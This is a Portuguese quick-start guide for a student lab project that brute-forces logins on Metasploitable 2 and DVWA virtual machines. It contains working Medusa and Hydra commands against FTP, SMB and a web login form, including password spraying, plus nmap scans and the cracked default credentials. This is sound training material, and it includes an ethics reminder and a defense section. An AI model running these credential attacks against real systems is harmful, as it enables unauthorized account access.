# 🚀 Guia Rápido de Início

## ⏱️ Início Rápido (5 minutos)

### 1. Clone ou Acesse o Projeto
```bash
git clone https://github.com/Hevellyntecn/medusa-brute-force-project.git
cd medusa-brute-force-project
```

### 2. Torne os Scripts Executáveis (Linux/Mac)
```bash
chmod +x scripts/*.sh
```

### 3. Execute o Setup Automático
```bash
cd scripts
./setup-environment.sh
```

Este script irá:
- ✅ Verificar ferramentas instaladas
- ✅ Criar estrutura de diretórios
- ✅ Testar conectividade com o alvo
- ✅ Gerar arquivo de configuração

### 4. Execute os Testes

**FTP:**
```bash
./test-ftp.sh 192.168.56.3
```

**DVWA:**
```bash
./test-dvwa.sh 192.168.56.3
```

**SMB:**
```bash
# Modo brute force
./test-smb.sh 192.168.56.3 brute

# Modo password spraying
./test-smb.sh 192.168.56.3 spray
```

---

## 📋 Checklist Pré-Execução

Antes de executar os testes, verifique:

- [ ] VirtualBox instalado e configurado
- [ ] VM Kali Linux rodando (192.168.56.2)
- [ ] VM Metasploitable 2 rodando (192.168.56.3)
- [ ] Rede configurada como Host-Only
- [ ] Conectividade entre VMs funcionando (ping)
- [ ] Ferramentas instaladas (Medusa, Hydra, Nmap)

### Verificação Rápida de Conectividade

```bash
# Do Kali Linux, teste:
ping -c 4 192.168.56.3
nmap -F 192.168.56.3
```

---

## 📁 Estrutura do Projeto

```
medusa-brute-force-project/
├── README.md              # Documentação principal
├── LICENSE                # Licença MIT
├── .gitignore            # Arquivos a ignorar no Git
│
├── docs/                 # Documentação detalhada
│   ├── MITIGACAO.md      # Guia de mitigação
│   ├── CONFIGURACAO.md   # Setup do ambiente
│   └── COMANDOS.md       # Referência de comandos
│
├── wordlists/            # Listas de senhas/usuários
│   ├── ftp-passwords.txt
│   ├── web-passwords.txt
│   ├── smb-passwords.txt
│   └── smb-users.txt
│
├── scripts/              # Scripts de automação
│   ├── setup-environment.sh
│   ├── test-ftp.sh
│   ├── test-dvwa.sh
│   └── test-smb.sh
│
└── logs/                 # Logs detalhados dos testes
    ├── ftp-attack.log
    ├── dvwa-attack.log
    ├── smb-attack.log
    └── .gitkeep
```

---

## 🎯 Comandos Essenciais

### Medusa - FTP
```bash
medusa -h 192.168.56.3 -u msfadmin -P wordlists/ftp-passwords.txt -M ftp
```

### Hydra - DVWA
```bash
hydra -l admin -P wordlists/web-passwords.txt \
  192.168.56.3 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

### Medusa - SMB
```bash
medusa -H wordlists/smb-users.txt -P wordlists/smb-passwords.txt \
  -M smbnt -h 192.168.56.3
```

### Nmap - Scan Rápido
```bash
nmap -sV -p 21,22,80,139,445 192.168.56.3
```

---

## 🐛 Problemas Comuns

### "Medusa/Hydra não encontrado"
```bash
# Debian/Kali/Ubuntu
sudo apt update
sudo apt install medusa hydra nmap

# Fedora/RHEL
sudo dnf install medusa hydra nmap
```

### "Não consigo pingar o alvo"
1. Verifique se ambas VMs estão em "Host-Only"
2. Confirme os IPs configurados:
   ```bash
   ip addr show
   ```
3. Reinicie o serviço de rede:
   ```bash
   sudo systemctl restart networking
   ```

### "Porta não está aberta"
```bash
# No Metasploitable, inicie os serviços:
sudo service vsftpd start
sudo service apache2 start
sudo service samba start
sudo service ssh start
```

### "Permission denied" ao executar scripts
```bash
chmod +x scripts/*.sh
```

---

## 📚 Leitura Recomendada

| Documento | Descrição | Tempo |
|-----------|-----------|-------|
| [README.md](../README.md) | Visão geral e cenários | 15 min |
| [CONFIGURACAO.md](docs/CONFIGURACAO.md) | Setup completo do lab | 20 min |
| [COMANDOS.md](docs/COMANDOS.md) | Referência rápida | 10 min |
| [MITIGACAO.md](docs/MITIGACAO.md) | Defesas e proteções | 25 min |

---

## 🎓 Fluxo de Aprendizado

1. **Teoria** (30 min)
   - Ler README.md principal
   - Entender conceitos de força bruta
   - Estudar arquitetura do lab

2. **Prática - Setup** (45 min)
   - Configurar VMs (CONFIGURACAO.md)
   - Instalar ferramentas
   - Validar conectividade

3. **Prática - Testes** (60 min)
   - Executar ataque FTP
   - Executar ataque DVWA
   - Executar ataque SMB
   - Documentar evidências nos logs

4. **Defesa** (45 min)
   - Ler guia de mitigação
   - Implementar Fail2Ban
   - Configurar rate limiting
   - Testar defesas

5. **Documentação** (30 min)
   - Analisar logs gerados
   - Escrever conclusões detalhadas
   - Atualizar README com métricas
   - Preparar relatório técnico

**Total:** ~3-4 horas

---

## 🎬 Exemplo de Sessão Completa

```bash
# 1. Preparar ambiente
cd medusa-brute-force-project/scripts
./setup-environment.sh

# 2. Testar FTP
./test-ftp.sh 192.168.56.3
# ✓ Credencial encontrada: msfadmin/msfadmin

# 3. Testar DVWA
./test-dvwa.sh 192.168.56.3
# ✓ Credencial encontrada: admin/password

# 4. Testar SMB
./test-smb.sh 192.168.56.3 spray
# ✓ Múltiplas credenciais encontradas

# 5. Ver logs gerados
ls -lh ../logs/

# 6. Analisar logs detalhadamente
cat ../logs/ftp-attack.log
cat ../logs/dvwa-attack.log
cat ../logs/smb-attack.log

# 7. Documentar no GitHub
cd ..
git add .
git commit -m "Adicionar evidências dos testes realizados"
git push
```

---

## 🔒 Lembrete de Segurança

**⚠️ IMPORTANTE:**

- ✅ Sempre teste APENAS em ambientes controlados
- ✅ Obtenha autorização por escrito antes de testar sistemas
- ✅ Documente todas as atividades
- ✅ Mantenha ética profissional
- ❌ NUNCA teste em sistemas de produção sem permissão
- ❌ NUNCA use para fins maliciosos

---

## 📝 Próximos Passos

Após concluir os testes básicos:

1. **Expandir Wordlists:**
   - Adicionar wordlists maiores (SecLists, RockYou)
   - Criar wordlists customizadas

2. **Experimentar Outras Ferramentas:**
   - John the Ripper
   - Hashcat
   - Burp Suite

3. **Testar Outros Serviços:**
   - MySQL (porta 3306)
   - PostgreSQL (porta 5432)
   - VNC (porta 5900)

4. **Implementar Defesas:**
   - Configurar Fail2Ban
   - Implementar 2FA
   - Criar honeypots

5. **Compartilhar Conhecimento:**
   - Publicar no GitHub
   - Apresentar para comunidade
   - Escrever artigo técnico

---

## 🆘 Precisa de Ajuda?

- 📖 Consulte a [documentação completa](../README.md)
- 🔍 Veja a [referência de comandos](docs/COMANDOS.md)
- 🐛 Verifique o [troubleshooting](docs/CONFIGURACAO.md#troubleshooting)
- 💬 Participe das discussões no GitHub Issues

---

## ✅ Entrega do Desafio DIO.ME

Para completar o desafio:

1. ✅ Criar repositório público no GitHub
2. ✅ Adicionar README.md detalhado com análises completas
3. ✅ Incluir wordlists e scripts funcionais
4. ✅ Adicionar logs detalhados em `/logs`
5. ✅ Documentar conclusões, métricas e aprendizados
6. ✅ Enviar link no portal da DIO

**Template para envio:**
```
Título: Projeto Medusa - Testes de Força Bruta em Ambiente Controlado
Link: https://github.com/Hevellyntecn/medusa-brute-force-project
Descrição: Implementação completa de testes de segurança usando Medusa,
incluindo ataques FTP, DVWA e SMB, com documentação detalhada de
mitigações e evidências dos testes realizados.
```

---

**Boa sorte com o projeto! 🚀**

*Desenvolvido para o desafio DIO.ME - Criando um Ataque Brute Force com Medusa e Kali Linux*
